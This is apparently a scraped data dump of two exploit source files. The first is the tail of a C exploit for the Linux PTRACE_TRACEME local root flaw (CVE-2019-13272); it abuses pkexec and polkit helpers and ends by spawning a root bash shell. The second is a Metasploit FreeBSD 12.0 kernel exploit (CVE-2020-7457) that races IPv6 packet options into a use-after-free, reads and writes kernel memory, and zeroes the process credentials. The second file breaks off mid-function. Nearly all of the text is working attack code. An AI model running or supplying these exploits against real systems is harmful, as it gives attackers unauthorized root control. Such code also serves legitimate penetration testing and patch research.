1\n\nstatic const char *SHELL = \"/bin/bash\";\n\nstatic int middle_success = 1;\nstatic int block_pipe[2];\nstatic int self_fd = -1;\nstatic int dummy_status;\nstatic const char *helper_path;\nstatic const char *pkexec_path = \"/usr/bin/pkexec\";\nstatic const char *pkaction_path = \"/usr/bin/pkaction\";\nstruct stat st;\n\nconst char *helpers[1024];\n\n/* known helpers to use if automatic targeting fails */\n#if ENABLE_FALLBACK_HELPERS\nconst char *known_helpers[] = {\n  \"/usr/lib/gnome-settings-daemon/gsd-backlight-helper\",\n  \"/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper\",\n  \"/usr/lib/unity-settings-daemon/usd-backlight-helper\",\n  \"/usr/lib/unity-settings-daemon/usd-wacom-led-helper\",\n  \"/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper\",\n  \"/usr/lib/x86_64-linux-gnu/cinnamon-settings-daemon/csd-backlight-helper\",\n  \"/usr/sbin/mate-power-backlight-helper\",\n  \"/usr/sbin/xfce4-pm-helper\",\n  \"/usr/bin/xfpm-power-backlight-helper\",\n  \"/usr/bin/lxqt-backlight_backend\",\n  \"/usr/libexec/gsd-wacom-led-helper\",\n  \"/usr/libexec/gsd-wacom-oled-helper\",\n  \"/usr/libexec/gsd-backlight-helper\",\n  \"/usr/lib/gsd-backlight-helper\",\n  \"/usr/lib/gsd-wacom-led-helper\",\n  \"/usr/lib/gsd-wacom-oled-helper\",\n  \"/usr/lib64/xfce4/session/xsfm-shutdown-helper\",\n};\n#endif\n\n/* helper executables known to cause problems (hang or fail) */\nconst char *blacklisted_helpers[] = {\n  \"/xf86-video-intel-backlight-helper\",\n  \"/cpugovctl\",\n  \"/resetxpad\",\n  \"/package-system-locked\",\n  \"/cddistupgrader\",\n};\n\n#define SAFE(expr) ({                   \\\n  typeof(expr) __res = (expr);          \\\n  if (__res == -1) {                    \\\n    dprintf(\"[-] Error: %s\\n\", #expr);  \\\n    return 0;                           \\\n  }                                     \\\n  __res;                                \\\n})\n#define max(a,b) ((a)>(b) ? (a) : (b))\n\n/*\n * execveat() syscall\n * https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl\n */\n#ifndef __NR_execveat\n#  define __NR_execveat 322\n#endif\n\n/* temporary printf; returned pointer is valid until next tprintf */\nstatic char *tprintf(char *fmt, ...) {\n  static char buf[10000];\n  va_list ap;\n  va_start(ap, fmt);\n  vsprintf(buf, fmt, ap);\n  va_end(ap);\n  return buf;\n}\n\n/*\n * fork, execute pkexec in parent, force parent to trace our child process,\n * execute suid executable (pkexec) in child.\n */\nstatic int middle_main(void *dummy) {\n  prctl(PR_SET_PDEATHSIG, SIGKILL);\n  pid_t middle = getpid();\n\n  self_fd = SAFE(open(\"/proc/self/exe\", O_RDONLY));\n\n  pid_t child = SAFE(fork());\n  if (child == 0) {\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n\n    SAFE(dup2(self_fd, 42));\n\n    /* spin until our parent becomes privileged (have to be fast here) */\n    int proc_fd = SAFE(open(tprintf(\"/proc/%d/status\", middle), O_RDONLY));\n    char *needle = tprintf(\"\\nUid:\\t%d\\t0\\t\", getuid());\n    while (1) {\n      char buf[1000];\n      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));\n      buf[buflen] = '\\0';\n      if (strstr(buf, needle)) break;\n    }\n\n    /*\n     * this is where the bug is triggered.\n     * while our parent is in the middle of pkexec, we force it to become our\n     * tracer, with pkexec's creds as ptracer_cred.\n     */\n    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));\n\n    /*\n     * now we execute a suid executable (pkexec).\n     * Because the ptrace relationship is considered to be privileged,\n     * this is a proper suid execution despite the attached tracer,\n     * not a degraded one.\n     * at the end of execve(), this process receives a SIGTRAP from ptrace.\n     */\n    execl(pkexec_path, basename(pkexec_path), NULL);\n\n    dprintf(\"[-] execl: Executing suid executable failed\");\n    exit(EXIT_FAILURE);\n  }\n\n  SAFE(dup2(self_fd, 0));\n  SAFE(dup2(block_pipe[1], 1));\n\n  /* execute pkexec as current user */\n  struct passwd *pw = getpwuid(getuid());\n  if (pw == NULL) {\n    dprintf(\"[-] getpwuid: Failed to retrieve username\");\n    exit(EXIT_FAILURE);\n  }\n\n  middle_success = 1;\n  execl(pkexec_path, basename(pkexec_path), \"--user\", pw->pw_name,\n        helper_path,\n        \"--help\", NULL);\n  middle_success = 0;\n  dprintf(\"[-] execl: Executing pkexec failed\");\n  exit(EXIT_FAILURE);\n}\n\n/* ptrace pid and wait for signal */\nstatic int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {\n  struct user_regs_struct regs;\n  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };\n  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));\n  SAFE(waitpid(pid, &dummy_status, 0));\n  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));\n\n  /* set up indirect arguments */\n  unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;\n  struct injected_page {\n    unsigned long argv[2];\n    unsigned long envv[1];\n    char arg0[8];\n    char path[1];\n  } ipage = {\n    .argv = { scratch_area + offsetof(struct injected_page, arg0) }\n  };\n  strcpy(ipage.arg0, arg0);\n  int i;\n  for (i = 0; i < sizeof(ipage)/sizeof(long); i++) {\n    unsigned long pdata = ((unsigned long *)&ipage)[i];\n    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),\n                (void*)pdata));\n  }\n\n  /* execveat(exec_fd, path, argv, envv, flags) */\n  regs.orig_rax = __NR_execveat;\n  regs.rdi = exec_fd;\n  regs.rsi = scratch_area + offsetof(struct injected_page, path);\n  regs.rdx = scratch_area + offsetof(struct injected_page, argv);\n  regs.r10 = scratch_area + offsetof(struct injected_page, envv);\n  regs.r8 = AT_EMPTY_PATH;\n\n  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));\n  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));\n  SAFE(waitpid(pid, &dummy_status, 0));\n\n  return 0;\n}\n\nstatic int middle_stage2(void) {\n  /* our child is hanging in signal delivery from execve()'s SIGTRAP */\n  pid_t child = SAFE(waitpid(-1, &dummy_status, 0));\n  return force_exec_and_wait(child, 42, \"stage3\");\n}\n\n// * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * *\n\nstatic int spawn_shell(void) {\n  SAFE(setresgid(0, 0, 0));\n  SAFE(setresuid(0, 0, 0));\n  execlp(SHELL, basename(SHELL), NULL);\n  dprintf(\"[-] execlp: Executing shell %s failed\", SHELL);\n  exit(EXIT_FAILURE);\n}\n\n// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * *\n\nstatic int check_env(void) {\n  int warn = 0;\n  const char* xdg_session = getenv(\"XDG_SESSION_ID\");\n\n  dprintf(\"[.] Checking environment ...\\n\");\n\n  if (stat(pkexec_path, &st) != 0) {\n    dprintf(\"[-] Could not find pkexec executable at %s\\n\", pkexec_path);\n    exit(EXIT_FAILURE);\n  }\n\n  if (stat(\"/dev/grsec\", &st) == 0) {\n    dprintf(\"[!] Warning: grsec is in use\\n\");\n    warn++;\n  }\n\n  if (xdg_session == NULL) {\n    dprintf(\"[!] Warning: $XDG_SESSION_ID is not set\\n\");\n    warn++;\n  }\n\n  if (system(\"/bin/loginctl --no-ask-password show-session \\\"$XDG_SESSION_ID\\\" | /bin/grep Remote=no >>/dev/null 2>>/dev/null\") != 0) {\n    dprintf(\"[!] Warning: Could not find active PolKit agent\\n\");\n    warn++;\n  }\n\n  if (system(\"/sbin/sysctl kernel.yama.ptrace_scope 2>&1 | /bin/grep -q [23]\") == 0) {\n    dprintf(\"[!] Warning: kernel.yama.ptrace_scope >= 2\\n\");\n    warn++;\n  }\n\n  if (stat(\"/usr/sbin/getsebool\", &st) == 0) {\n    if (system(\"/usr/sbin/getsebool deny_ptrace 2>&1 | /bin/grep -q on\") == 0) {\n      dprintf(\"[!] Warning: SELinux deny_ptrace is enabled\\n\");\n      warn++;\n    }\n  }\n\n  if (warn > 0) {\n    dprintf(\"[~] Done, with %d warnings\\n\", warn);\n  } else {\n    dprintf(\"[~] Done, looks good\\n\");\n  }\n\n  return warn;\n}\n\n/*\n * Use pkaction to search PolKit policy actions for viable helper executables.\n * Check each action for allow_active=yes, extract the associated helper path,\n * and check the helper path exists.\n */\n#if ENABLE_AUTO_TARGETING\nint find_helpers() {\n  if (stat(pkaction_path, &st) != 0) {\n    dprintf(\"[-] No helpers found. Could not find pkaction executable at %s.\\n\", pkaction_path);\n    return 0;\n  }\n\n  char cmd[1024];\n  snprintf(cmd, sizeof(cmd), \"%s --verbose\", pkaction_path);\n  FILE *fp;\n  fp = popen(cmd, \"r\");\n  if (fp == NULL) {\n    dprintf(\"[-] Failed to run %s: %m\\n\", cmd);\n    return 0;\n  }\n\n  char line[1024];\n  char buffer[2048];\n  int helper_index = 0;\n  int useful_action = 0;\n  int blacklisted_helper = 0;\n  static const char *needle = \"org.freedesktop.policykit.exec.path -> \";\n  int needle_length = strlen(needle);\n\n  while (fgets(line, sizeof(line)-1, fp) != NULL) {\n    /* check the action uses allow_active=yes */\n    if (strstr(line, \"implicit active:\")) {\n      if (strstr(line, \"yes\")) {\n        useful_action = 1;\n      }\n      continue;\n    }\n\n    if (useful_action == 0)\n      continue;\n\n    useful_action = 0;\n\n    /* extract the helper path */\n    int length = strlen(line);\n    char* found = memmem(&line[0], length, needle, needle_length);\n    if (found == NULL)\n      continue;\n\n    memset(buffer, 0, sizeof(buffer));\n    int i;\n    for (i = 0; found[needle_length + i] != '\\n'; i++) {\n      if (i >= sizeof(buffer)-1)\n        continue;\n      buffer[i] = found[needle_length + i];\n    }\n\n    /* check helper path against helpers defined in 'blacklisted_helpers' array */\n    blacklisted_helper = 0;\n    for (i=0; i<sizeof(blacklisted_helpers)/sizeof(blacklisted_helpers[0]); i++) {\n      if (strstr(&buffer[0], blacklisted_helpers[i]) != 0) {\n        dprintf(\"[.] Ignoring helper (blacklisted): %s\\n\", &buffer[0]);\n        blacklisted_helper = 1;\n        break;\n      }\n    }\n    if (blacklisted_helper == 1)\n      continue;\n\n    /* check the path exists */\n    if (stat(&buffer[0], &st) != 0) {\n      dprintf(\"[.] Ignoring helper (does not exist): %s\\n\", &buffer[0]);\n      continue;\n    }\n\n    helpers[helper_index] = strndup(&buffer[0], strlen(buffer));\n    helper_index++;\n\n    if (helper_index >= sizeof(helpers)/sizeof(helpers[0]))\n      break;\n  }\n\n  pclose(fp);\n  return 0;\n}\n#endif\n\n// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *\n\nint ptrace_traceme_root() {\n  dprintf(\"[.] Trying helper: %s\\n\", helper_path);\n\n  /*\n   * set up a pipe such that the next write to it will block: packet mode,\n   * limited to one packet\n   */\n  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));\n  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));\n  char dummy = 0;\n  SAFE(write(block_pipe[1], &dummy, 1));\n\n  /* spawn pkexec in a child, and continue here once our child is in execve() */\n  dprintf(\"[.] Spawning suid process (%s) ...\\n\", pkexec_path);\n  static char middle_stack[1024*1024];\n  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),\n                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));\n  if (!middle_success) return 1;\n\n  /*\n   * wait for our child to go through both execve() calls (first pkexec, then\n   * the executable permitted by polkit policy).\n   */\n  while (1) {\n    int fd = open(tprintf(\"/proc/%d/comm\", midpid), O_RDONLY);\n    char buf[16];\n    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));\n    buf[buflen] = '\\0';\n    *strchrnul(buf, '\\n') = '\\0';\n    if (strncmp(buf, basename(helper_path), 15) == 0)\n      break;\n    usleep(100000);\n  }\n\n  /*\n   * our child should have gone through both the privileged execve() and the\n   * following execve() here\n   */\n  dprintf(\"[.] Tracing midpid ...\\n\");\n  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));\n  SAFE(waitpid(midpid, &dummy_status, 0));\n  dprintf(\"[~] Attached to midpid\\n\");\n\n  force_exec_and_wait(midpid, 0, \"stage2\");\n  exit(EXIT_SUCCESS);\n}\n\nint main(int argc, char **argv) {\n  if (strcmp(argv[0], \"stage2\") == 0)\n    return middle_stage2();\n  if (strcmp(argv[0], \"stage3\") == 0)\n    return spawn_shell();\n\n  dprintf(\"Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\\n\");\n\n  check_env();\n\n  if (argc > 1 && strcmp(argv[1], \"check\") == 0) {\n    exit(0);\n  }\n\n  int i;\n\n#if ENABLE_AUTO_TARGETING\n  /* search polkit policies for helper executables */\n  dprintf(\"[.] Searching policies for useful helpers ...\\n\");\n  find_helpers();\n  for (i=0; i<sizeof(helpers)/sizeof(helpers[0]); i++) {\n    if (helpers[i] == NULL)\n      break;\n\n    if (stat(helpers[i], &st) != 0)\n      continue;\n\n    helper_path = helpers[i];\n    ptrace_traceme_root();\n  }\n#endif\n\n#if ENABLE_FALLBACK_HELPERS\n  /* search for known helpers defined in 'known_helpers' array */\n  dprintf(\"[.] Searching for known helpers ...\\n\");\n  for (i=0; i<sizeof(known_helpers)/sizeof(known_helpers[0]); i++) {\n    if (stat(known_helpers[i], &st) != 0)\n      continue;\n\n    helper_path = known_helpers[i];\n    dprintf(\"[~] Found known helper: %s\\n\", helper_path);\n    ptrace_traceme_root();\n  }\n#endif\n\n  dprintf(\"[~] Done\\n\");\n\n  return 0;\n}\n", "timestamp": "2025-10-24T23:39:35.457815"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2020-7457/exploit.c", "content": "/*\n  FreeBSD 12.0-RELEASE x64 Kernel Exploit\n\n  Usage:\n    $ clang -o exploit exploit.c -lpthread\n    $ ./exploit\n*/\n// msf note: written by theflow0: https://hackerone.com/reports/826026\n\n#include <errno.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <stddef.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <pthread.h>\n#define _KERNEL\n#include <sys/event.h>\n#undef _KERNEL\n#define _WANT_FILE\n#include <sys/file.h>\n#include <sys/filedesc.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/socket.h>\n#define _WANT_SOCKET\n#include <sys/socketvar.h>\n#include <netinet/in.h>\n#define _WANT_INPCB\n#include <netinet/in_pcb.h>\n#include <netinet/ip6.h>\n#include <netinet6/ip6_var.h>\n\n// #define FBSD12\n\n#define ELF_MAGIC 0x464c457f\n\n#define IPV6_2292PKTINFO 19\n#define IPV6_2292PKTOPTIONS 25\n\n#define TCLASS_MASTER 0x13370000\n#define TCLASS_SPRAY 0x41\n#define TCLASS_TAINT 0x42\n\n#define NUM_SPRAY_RACE 0x20\n#define NUM_SPRAY 0x100\n#define NUM_KQUEUES 0x100\n\n#ifdef FBSD12\n#define ALLPROC_OFFSET 0x1df3c38\n#else\n#define ALLPROC_OFFSET 0xf01e40\n#endif\n\n#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))\n#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))\n#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))\n\n#define PROC_LIST_OFFSET (offsetof(struct proc, p_list))\n#define PROC_UCRED_OFFSET (offsetof(struct proc, p_ucred))\n#define PROC_FD_OFFSET (offsetof(struct proc, p_fd))\n#define PROC_PID_OFFSET (offsetof(struct proc, p_pid))\n\n#ifdef FBSD12\n\n#define FILEDESC_FILES_OFFSET (offsetof(struct filedesc, fd_files))\n#define FILEDESCENTTBL_OFILES_OFFSET (offsetof(struct fdescenttbl, fdt_ofiles))\n#define FILEDESCENTTBL_NFILES_OFFSET (offsetof(struct fdescenttbl, fdt_nfiles))\n#define FILEDESCENT_FILE_OFFSET (offsetof(struct filedescent, fde_file))\n#define FILE_TYPE_OFFSET (offsetof(struct file, f_type))\n#define FILE_DATA_OFFSET (offsetof(struct file, f_data))\n\n#else\n\n#define FILEDESC_OFILES_OFFSET (offsetof(struct filedesc, fd_ofiles))\n#define FILEDESC_NFILES_OFFSET (offsetof(struct filedesc, fd_nfiles))\n#define FILE_TYPE_OFFSET (offsetof(struct file, f_type))\n#define FILE_DATA_OFFSET (offsetof(struct file, f_data))\n\n#endif\n\n#define KNOTE_FOP_OFFSET (offsetof(struct knote, kn_fop))\n#define FILTEROPS_DETACH_OFFSET (offsetof(struct filterops, f_detach))\n\n#define SOCKET_PCB_OFFSET (offsetof(struct socket, so_pcb))\n#define INPCB_OUTPUTOPTS_OFFSET (offsetof(struct inpcb, in6p_outputopts))\n\nint kqueue(void);\nint kevent(int kq, const struct kevent *changelist, int nchanges,\n           struct kevent *eventlist, int nevents,\n           const struct timespec *timeout);\n\nstatic uint64_t kernel_base;\nstatic uint64_t p_ucred, p_fd;\nstatic uint64_t kevent_addr, pktopts_addr;\n\nstatic int triggered = 0;\nstatic int kevent_sock, master_sock, overlap_sock, victim_sock;\nstatic int spray_sock[NUM_SPRAY];\nstatic int kq[NUM_KQUEUES];\n\nstatic void hexDump(const void *data, size_t size) {\n  size_t i;\n  for(i = 0; i < size; i++) {\n    printf(\"%02hhX%c\", ((char *)data)[i], (i + 1) % 16 ? ' ' : '\\n');\n  }\n  printf(\"\\n\");\n}\n\nstatic int new_socket(void) {\n  return socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);\n}\n\nstatic void build_tclass_cmsg(char *buf, int val) {\n  struct cmsghdr *cmsg;\n\n  cmsg = (struct cmsghdr *)buf;\n  cmsg->cmsg_len = CMSG_LEN(sizeof(int));\n  cmsg->cmsg_level = IPPROTO_IPV6;\n  cmsg->cmsg_type = IPV6_TCLASS;\n\n  *(int *)CMSG_DATA(cmsg) = val;\n}\n\nstatic int build_rthdr_msg(char *buf, int size) {\n  struct ip6_rthdr *rthdr;\n  int len;\n\n  len = ((size >> 3) - 1) & ~1;\n  size = (len + 1) << 3;\n\n  memset(buf, 0, size);\n\n  rthdr = (struct ip6_rthdr *)buf;\n  rthdr->ip6r_nxt = 0;\n  rthdr->ip6r_len = len;\n  rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;\n  rthdr->ip6r_segleft = rthdr->ip6r_len >> 1;\n\n  return size;\n}\n\nstatic int get_rthdr(int s, char *buf, socklen_t len) {\n  return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &len);\n}\n\nstatic int set_rthdr(int s, char *buf, socklen_t len) {\n  return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);\n}\n\nstatic int free_rthdr(int s) {\n  return set_rthdr(s, NULL, 0);\n}\n\nstatic int get_tclass(int s) {\n  int val;\n  socklen_t len = sizeof(val);\n  getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, &len);\n  return val;\n}\n\nstatic int set_tclass(int s, int val) {\n  return setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val));\n}\n\nstatic int get_pktinfo(int s, char *buf) {\n  socklen_t len = sizeof(struct in6_pktinfo);\n  return getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &len);\n}\n\nstatic int set_pktinfo(int s, char *buf) {\n  return setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo));\n}\n\nstatic int set_pktopts(int s, char *buf, socklen_t len) {\n  return setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len);\n}\n\nstatic int free_pktopts(int s) {\n  return set_pktopts(s, NULL, 0);\n}\n\nstatic uint64_t leak_rthdr_ptr(int s) {\n  char buf[0x100];\n  get_rthdr(s, buf, sizeof(buf));\n  return *(uint64_t *)(buf + PKTOPTS_RTHDR_OFFSET);\n}\n\nstatic uint64_t leak_kmalloc(char *buf, int size) {\n  int rthdr_len = build_rthdr_msg(buf, size);\n  set_rthdr(master_sock, buf, rthdr_len);\n#ifdef FBSD12\n  get_rthdr(master_sock, buf, rthdr_len);\n  return *(uint64_t *)(buf + 0x00);\n#else\n  return leak_rthdr_ptr(overlap_sock);\n#endif\n}\n\nstatic void write_to_victim(uint64_t addr) {\n  char buf[sizeof(struct in6_pktinfo)];\n  *(uint64_t *)(buf + 0x00) = addr;\n  *(uint64_t *)(buf + 0x08) = 0;\n  *(uint32_t *)(buf + 0x10) = 0;\n  set_pktinfo(master_sock, buf);\n}\n\nstatic int find_victim_sock(void) {\n  char buf[sizeof(struct in6_pktinfo)];\n\n  write_to_victim(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);\n\n  for (int i = 0; i < NUM_SPRAY; i++) {\n    get_pktinfo(spray_sock[i], buf);\n    if (*(uint64_t *)(buf + 0x00) != 0)\n      return i;\n  }\n\n  return -1;\n}\n\nstatic uint8_t kread8(uint64_t addr) {\n  char buf[sizeof(struct in6_pktinfo)];\n  write_to_victim(addr);\n  get_pktinfo(victim_sock, buf);\n  return *(uint8_t *)buf;\n}\n\nstatic uint16_t kread16(uint64_t addr) {\n  char buf[sizeof(struct in6_pktinfo)];\n  write_to_victim(addr);\n  get_pktinfo(victim_sock, buf);\n  return *(uint16_t *)buf;\n}\n\nstatic uint32_t kread32(uint64_t addr) {\n  char buf[sizeof(struct in6_pktinfo)];\n  write_to_victim(addr);\n  get_pktinfo(victim_sock, buf);\n  return *(uint32_t *)buf;\n}\n\nstatic uint64_t kread64(uint64_t addr) {\n  char buf[sizeof(struct in6_pktinfo)];\n  write_to_victim(addr);\n  get_pktinfo(victim_sock, buf);\n  return *(uint64_t *)buf;\n}\n\nstatic void kread(void *dst, uint64_t src, size_t len) {\n  for (int i = 0; i < len; i++)\n    ((uint8_t *)dst)[i] = kread8(src + i);\n}\n\nstatic void kwrite64(uint64_t addr, uint64_t val) {\n  int fd = open(\"/dev/kmem\", O_RDWR);\n  if (fd >= 0) {\n    lseek(fd, addr, SEEK_SET);\n    write(fd, &val, sizeof(val));\n    close(fd);\n  }\n}\n\nstatic int kwrite(uint64_t addr, void *buf) {\n  write_to_victim(addr);\n  return set_pktinfo(victim_sock, buf);\n}\n\nstatic uint64_t find_kernel_base(uint64_t addr) {\n  addr &= ~(PAGE_SIZE - 1);\n  while (kread32(addr) != ELF_MAGIC)\n    addr -= PAGE_SIZE;\n  return addr;\n}\n\nstatic int find_proc_cred_and_fd(pid_t pid) {\n  uint64_t proc = kread64(kernel_base + ALLPROC_OFFSET);\n\n  while (proc) {\n    if (kread32(proc + PROC_PID_OFFSET) == pid) {\n      p_ucred = kread64(proc + PROC_UCRED_OFFSET);\n      p_fd = kread64(proc + PROC_FD_OFFSET);\n      printf(\"[+] p_ucred: 0x%lx\\n\", p_ucred);\n      printf(\"[+] p_fd: 0x%lx\\n\", p_fd);\n      return 0;\n    }\n\n    proc = kread64(proc + PROC_LIST_OFFSET);\n  }\n\n  return -1;\n}\n\n#ifdef FBSD12\n\nstatic uint64_t find_socket_data(int s) {\n  uint64_t files, ofiles, fp;\n  int nfiles;\n  short type;\n\n  files = kread64(p_fd + FILEDESC_FILES_OFFSET);\n  if (!files)\n    return 0;\n\n  ofiles = files + FILEDESCENTTBL_OFILES_OFFSET;\n\n  nfiles = kread32(files + FILEDESCENTTBL_NFILES_OFFSET);\n  if (s < 0 || s >= nfiles)\n    return 0;\n\n  fp = kread64(ofiles + s * sizeof(struct filedescent) + FILEDESCENT_FILE_OFFSET);\n  if (!fp)\n    return 0;\n\n  type = kread16(fp + FILE_TYPE_OFFSET);\n  if (type != DTYPE_SOCKET)\n    return 0;\n\n  return kread64(fp + FILE_DATA_OFFSET);\n}\n\n#else\n\nstatic uint64_t find_socket_data(int s) {\n  uint64_t ofiles, fp;\n  int nfiles;\n  short type;\n\n  ofiles = kread64(p_fd + FILEDESC_OFILES_OFFSET);\n  if (!ofiles)\n    return 0;\n\n  nfiles = kread32(p_fd + FILEDESC_NFILES_OFFSET);\n  if (s < 0 || s >= nfiles)\n    return 0;\n\n  fp = kread64(ofiles + s * sizeof(struct file *));\n  if (!fp)\n    return 0;\n\n  type = kread16(fp + FILE_TYPE_OFFSET);\n  if (type != DTYPE_SOCKET)\n    return 0;\n\n  return kread64(fp + FILE_DATA_OFFSET);\n}\n\n#endif\n\nstatic uint64_t find_socket_pcb(int s) {\n  uint64_t f_data;\n\n  f_data = find_socket_data(s);\n  if (!f_data)\n    return 0;\n\n  return kread64(f_data + SOCKET_PCB_OFFSET);\n}\n\nstatic uint64_t find_socket_pktopts(int s) {\n  uint64_t in6p;\n\n  in6p = find_socket_pcb(s);\n  if (!in6p)\n    return 0;\n\n  return kread64(in6p + INPCB_OUTPUTOPTS_OFFSET);\n}\n\nstatic void cleanup(void) {\n  uint64_t master_pktopts, overlap_pktopts, victim_pktopts;\n\n  master_pktopts  = find_socket_pktopts(master_sock);\n  overlap_pktopts = find_socket_pktopts(overlap_sock);\n  victim_pktopts  = find_socket_pktopts(victim_sock);\n\n  kwrite64(master_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);\n  kwrite64(overlap_pktopts + PKTOPTS_RTHDR_OFFSET, 0);\n  kwrite64(victim_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);\n}\n\nstatic void escalate_privileges(void) {\n  char buf[sizeof(struct in6_pktinfo)];\n\n  *(uint32_t *)(buf + 0x00) = 0; // cr_uid\n  *(uint32_t *)(buf + 0x04) = 0; // cr_ruid\n  *(uint32_t *)(buf + 0x08) = 0; // cr_svuid\n  *(uint32_t *)(buf + 0x0c) = 1; // cr_ngroups\n  *(uint32_t *)(buf + 0x10) = 0; // cr_rgid\n\n  kwrite(p_ucred + 4, buf);\n}\n\nstatic int find_overlap_sock(void) {\n  set_tclass(master_sock, TCLASS_TAINT);\n\n  for (int i = 0; i < NUM_SPRAY; i++) {\n    if (get_tclass(spray_sock[i]) == TCLASS_TAINT)\n      return i;\n  }\n\n  return -1;\n}\n\nstatic int spray_pktopts(void) {\n  for (int i = 0; i < NUM_SPRAY_RACE; i++)\n    set_tclass(spray_sock[i], TCLASS_SPRAY);\n\n  if (get_tclass(master_sock) == TCLASS_SPRAY)\n    return 1;\n\n  for (int i = 0; i < NUM_SPRAY_RACE; i++)\n    free_pktopts(spray_sock[i]);\n\n  return 0;\n}\n\nstatic void *use_thread(void *arg) {\n  char buf[CMSG_SPACE(sizeof(int))];\n  build_tclass_cmsg(buf, 0);\n\n  while (!triggered && get_tclass(master_sock) != TCLASS_SPRAY) {\n    set_pktopts(master_sock, buf, sizeof(buf));\n\n#ifdef FBSD12\n     usleep(100);\n#endif\n  }\n\n  triggered = 1;\n  return NULL;\n}\n\nstatic void *free_thread(void *arg) {\n  while (!triggered && get_tclass(master_sock) != TCLASS_SPRAY) {\n    free_pktopts(master_sock);\n\n#ifdef FBSD12\n    if (spray_pktopts())\n      break;\n#endif\n\n    usleep(100);\n  }\n\n  triggered = 1;\n  return NULL;\n}\n\nstatic int trigger_uaf(void) {\n  pthread_t th[2];\n\n  pthread_create(&th[0], NULL, use_thread, NULL);\n  pthread_create(&th[1], NULL, free_thread, NULL);\n\n  while (1) {\n    if (spray_pktopts())\n      break;\n\n#ifndef FBSD12\n    usleep(100);\n#endif\n  }\n\n  triggered = 1;\n\n  pthread_join(th[0], NULL);\n  pthread_join(th[1], NULL);\n\n  return find_overlap_sock();\n}\n\nstatic int fake_pktopts(uint64_t pktinfo) {\n  char buf[0x100];\n  int rthdr_len, tclass;\n\n  // Free master_sock's pktopts\n  free_pktopts(overlap_sock);\n\n  // Spray rthdr's to refill master_sock's pktopts\n  rthdr_len = build_rthdr_msg(buf, 0x100);\n  for (int i = 0; i < NUM_SPRAY; i++) {\n    *(uint64_t *)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;\n    *(uint32_t *)(buf + PKTOPTS_TCLASS_OFFSET)  = TCLASS_MASTER | i;\n    set_rthdr(spray_sock[i], buf, rthdr_len);\n  }\n\n  tclass = get_tclass(master_sock);\n\n  // See if pktopts has been refilled correctly\n  if ((tclass & 0xffff0000) != TCLASS_MASTER) {\n    printf(\"[-] Error could not refill pktopts.\\n\");\n    exit(1);\n  }\n\n  return tclass & 0xffff;\n}\n\nstatic void leak_kevent_pktopts(void) {\n  char buf[0x800];\n\n  struct kevent kv;\n  EV_SET(&kv, kevent_sock, EVFILT_READ, EV_ADD, 0, 5, NULL);\n\n  // Free pktopts\n  for (int i = 0; i < NUM_SPRAY; i++)\n    free_pktopts(spray_sock[i]);\n\n  // Leak 0x800 kmalloc addr\n  kevent_addr = leak_kmalloc(buf, 0x800);\n  printf(\"[+] kevent_addr: 0x%lx\\n\", kevent_addr);\n\n  // Free rthdr buffer and spray kevents to occupy this location\n  free_rthdr(master_sock);\n  for (int i = 0; i < NUM_KQUEUES; i++)\n    kevent(kq[i], &kv, 1, 0, 0, 0);\n\n  // Leak 0x100 kmalloc addr\n  pktopts_addr = leak_kmalloc(buf, 0x100);\n  printf(\"[+] pktopts_addr: 0x%lx\\n\", pktopts_addr);\n\n  // Free rthdr buffer and spray pktopts to occupy this location\n  free_rthdr(master_sock);\n  for (int i = 0; i < NUM_SPRAY; i++)\n    set_tclass(spray_sock[i], 0);\n}\n\nint main(int argc, char *argv[]) {\n  uint64_t knote, kn_fop, f_detach;\n  int idx;\n\n  printf(\"[*] Initializing sockets...\\n\");\n\n  kevent_sock = new_socket();\n  master_sock = new_socket();\n\n  for (int i = 0; i < NUM_SPRAY; i++)\n  